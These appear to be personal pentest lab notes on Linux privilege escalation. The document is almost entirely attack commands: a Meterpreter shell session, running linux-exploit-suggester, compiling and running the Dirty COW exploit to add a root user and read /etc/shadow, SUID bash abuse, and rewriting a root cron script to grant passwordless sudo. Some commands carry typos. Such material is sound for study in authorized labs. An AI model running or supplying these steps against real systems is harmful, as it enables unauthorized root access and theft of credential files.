# Linux Kernel Exploits

https://github.com/The-Z-Labs/linux-exploit-suggester

### Meterpreter
```js
meterpreter> sysinfo
meterpreter> getuid
meterpreter> shell
/bin/bash -i

ubuntu$> groups www-data
ubuntu$> cat /etc/passwd
ubuntu$> sudo apt-get update
ubuntu$> exit  (//terminate)

```

Suggester quick download:
```python
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
```

### Meterpreter
```js
meterpreter> cd /tmp
meterpreter> upload ~/Desktop/Linux-Enum/les.sh
meterpreter> shell
/bin/bash -i

ubuntu$> ls
ubuntu$> chmod +x les.sh
ubuntu$> ls -alps
ubuntu$> ./les.sh     (//go in details abou dirtycow exploit)
// Search "Dirty COW" exploit on exploit-db
// https://www.exploit-db.com/exploits/40839
// https://dirtycow.ninja
Download Exploit  ("On my machine")
Kali$> sudo apt-get install gcc
Kali$> cd Downloads
Kali$> mv 40839.c dirty.c   //rename
Kali$> gcc -pthread dirty.c -o dirty -lcrypt
Kali$> ls    //shows dirty

// Go to Meterpreter Session
meterpreter> upload ~/Downloads/dirty
meterpreter> shell
/bin/bash -i

ubuntu$> ls
ubuntu$> chmod +x dirty
ubuntu$> ./dirty password123
ubuntu$> rm dirty
ubuntu$> ^C   (//terminate)

// Go to Meterpreter Session
meterpreter> upload ~/Downloads/dirty.c
meterpreter> shell
/bin/bash -i

ubuntu$> ls
ubuntu$> gcc -pthread dirty.c -o dirty -lcrypt
ubuntu$> ls
ubuntu$> ./dirty password123
ubuntu$> cat /etc/passwd
ubuntu$> su firefart   //password123   //maybe cause error so we use SSH

"Use SSH"  //from our machine
	Kali$> ssh firefart@192.168.2.3   //password123
/if keygen error do this -->
Kali$> ssh-keygen -f "/home/kali/.ssh/known_hosts" -R "192.168.2.3"
Kali$> ssh firefart@192.168.2.3   //password123

Rootubuntu$> sudo apt-get update
Rootubuntu$> cat /etc/shadow
```


# SUID Binaries

```js
find / -perm /4000 2>/dev/null
```

### Demo
```js
root$> chmod +s /bin/bash
-->
user$> find / -perm /4000 2>/dev/null
user$> /bin/bash -p
##and we get root
```


https://gtfobins.github.io/ 



# Cron Jobs

### Demo (Cron Jobs)
```js
student$> whoami
student$> groups
student$> cat /etc/passwd

student$> crontab -l
student$> ls -al         //lists a file called "message"
student$> cat message    //access denied
student$> pwd            //lists path
student$> cd /
student$> grep -rnw /usr -e "/home/student/message"   //we can see copy.sh file
// or we can use this --> grep -nri "/tmp/message" /usr
student$> ls -al /usr/local/share/copy.sh      //given from the prev command
student$> cat /usr/local/share/copy.sh       // outputs the cron job
student$> printf '#!/bin/bash\necho "student ALL=NOPAASWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
student$> cat /usr/local/share/copy.sh
student$> sudo -l
student$> sudo su
root$> whoami
root$> cat /root/flag
root$> crontab -l
```
